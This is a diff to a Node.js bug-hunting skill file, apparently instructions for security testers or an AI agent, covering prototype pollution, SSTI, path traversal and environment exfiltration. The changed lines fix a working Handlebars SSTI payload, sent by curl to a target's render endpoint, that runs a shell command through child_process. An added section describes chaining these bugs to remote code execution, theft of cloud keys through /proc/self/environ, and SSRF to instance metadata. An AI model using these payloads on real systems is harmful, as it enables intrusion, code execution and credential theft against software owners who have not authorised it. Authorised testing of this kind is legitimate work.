@@ -1,6 +1,6 @@
 ---
 name: hunt-nodejs
-description: Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa.
+description: "Hunt Node.js specific vulnerabilities — Prototype Pollution → RCE chains (lodash/merge/assign), Express trust proxy misconfiguration, child_process/eval injection, template engine SSTI (EJS/Pug/Handlebars), path traversal in file servers, require() injection, environment variable exfil via /proc/self/environ. Use when target runs Node.js/Express/Fastify/NestJS/Koa."
 sources: hackerone_public, snyk_research, portswigger_research
 report_count: 24
 ---
@@ -155,7 +155,7 @@ curl -s -X POST https://$TARGET/api/render \
 # Handlebars — prototype pollution via template
 curl -s -X POST https://$TARGET/api/render \
   -H "Content-Type: application/json" \
-  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require(childprocess).execSync(id)\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
+  -d '{"template": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return process.mainModule.require('child_process').execSync('id')\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"}'
 ```
 
 ---
@@ -217,3 +217,14 @@ curl -s "https://$TARGET/api/file?path=/proc/self/cwd"       # working directory
 - child_process injection: Critical
 - Trust proxy → rate limit bypass: Medium
 - /proc/self/environ exfil: High (if cloud keys present)
+
+---
+
+## Related Skills
+
+- **`hunt-rce`** — every Node sink class here (prototype pollution → `child_process`, SSTI, command injection) terminates in RCE. Chain primitive: confirmed pollution/SSTI → reach an exec sink → OOB callback or `id` output.
+- **`hunt-ssti`** — EJS/Pug/Handlebars template injection is the cross-language SSTI skill specialized for Node engines here. Chain primitive: `<%= 7*7 %>`/`#{7*7}` reflects 49 → escalate to the engine-specific RCE payload.
+- **`hunt-nextjs`** — Next.js API routes are Node/Express under the hood and inherit these sinks. Chain primitive: Next.js detected → run these prototype-pollution and SSTI probes against `/api/`.
+- **`hunt-ssrf`** — Express `trust proxy` plus a `fetch`/proxy endpoint enables internal requests; `/proc/self/environ` exfil chains to cloud keys. Chain primitive: spoof `X-Forwarded-For` / abuse a fetch endpoint → IMDS.
+- **`hunt-source-leak`** — exposed `package.json`/`package-lock.json` pin vulnerable dependency versions (lodash, ejs, handlebars). Chain primitive: leak lockfile → map to CVE (e.g. lodash CVE-2021-23337) → targeted pollution payload.
+- **`triage-validation`** — prototype-pollution reflection without a reached sink, and SSTI math without RCE, are the common over-reports. Chain primitive: require OOB or sink output before claiming Critical.
